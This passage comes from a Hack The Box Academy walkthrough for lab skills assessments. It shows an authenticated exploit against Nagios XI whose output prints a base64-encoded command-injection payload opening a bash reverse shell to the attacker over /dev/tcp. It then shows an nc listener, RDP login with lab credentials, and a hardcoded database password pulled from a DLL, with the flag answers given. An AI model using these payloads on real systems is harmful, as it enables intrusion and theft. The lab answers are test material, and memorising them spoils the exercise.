┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xkwaxbamrq]─[~]
└──╼ [★]$ python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' 10.10.14.45 9001 &
[10] 19971
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xkwaxbamrq]─[~]
└──╼ [★]$ [+] Extract login nsp token : ab9c5412200281843f9ac8cc585265eef66d6494e2dbfec74773e4b959318681
[+] Login ... Success!
[+] Request upload form ...
[+] Extract upload nsp token : a1937444e67009d15b2ba703ce39e82081662ad065e94586aeac3552153862f1
[+] Base64 encoded payload : ;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40NS85MDAxIDA+JjE= | base64 -d | bash;#
[+] Sending payload ...
[+] Check your nc ...
Ncat: Connection from 10.129.14.213.
Ncat: Connection from 10.129.14.213:48286.
bash: cannot set terminal process group (1119): Inappropriate ioctl for device
bash: no job control in this shell
www-data@skills2:/usr/local/nagiosxi/html/admin$
```

Once the reverse shell has been attained, students need to press Enter and then use `fg` on the `nc` job ID (9 in here):

```shell
fg 9
```

```shell-session
www-data@skills2:/usr/local/nagiosxi/html/admin$ 

[9]+  Stopped                 nc -nvlp 9001
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-xkwaxbamrq]─[~]
└──╼ [★]$ fg 9

nc -nvlp 9001 
whoami
whoami

www-data
```

At last, students need to print out the contents of the flag file "f5088a862528cbb16b4e253f1809882c_flag.txt", which is located in the same landing directory of the reverse shell:

```shell
cat f5088a862528cbb16b4e253f1809882c_flag.txt
```

```shell-session
www-data@skills2:/usr/local/nagiosxi/html/admin$ cat f5088a862528cbb16b4e253f1809882c_flag.txt
<dmin$ cat f5088a862528cbb16b4e253f1809882c_flag.txt

afe377683dce373ec2bf7eaf1e0107eb
```

Alternatively, students can use the `Metasploit` module `exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce`

Answer: `afe377683dce373ec2bf7eaf1e0107eb`

# Attacking Common Applications - Skills Assessment III

## Question 1

### "What is the hardcoded password for the database connection in the MultimasterAPI.dll file?"

After spawning the target machine, students need to connect to the target with the credentials `administrator:xcyj8izxNVzhf4z` using RDP:

```shell
xfreerdp /v:STMIP /u:administrator /p:xcyj8izxNVzhf4z /dynamic-resolution
```

```shell-session
┌─[eu-academy-1]─[10.10.14.228]─[htb-ac-594497@htb-llk3gi0m2q]─[~]
└──╼ [★]$ xfreerdp /v:10.129.95.200 /u:administrator /p:xcyj8izxNVzhf4z /dynamic-resolution

[17:33:32:641] [15032:15035] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[17:33:32:641] [15032:15035] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[17:33:32:641] [15032:15035] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Then, students need to open File Explorer and navigate to `C:\inetpub\wwwroot\bin` where they will find `MultimasterAPI.dll`:

![Attacking_Common_Applications_Walkthrough_Image_117.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_117.png)

Subsequently, students need to open another File Explorer , navigate to `C:\Tools\dnSpy` and then drag the `MultimasterAPI.dll` file onto the `dnSpy.exe`, to find the password `D3veL0pM3nT!` hardcoded in the SQL connection string:

![Attacking_Common_Applications_Walkthrough_Image_118.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_118.png)

Answer: `D3veL0pM3nT!`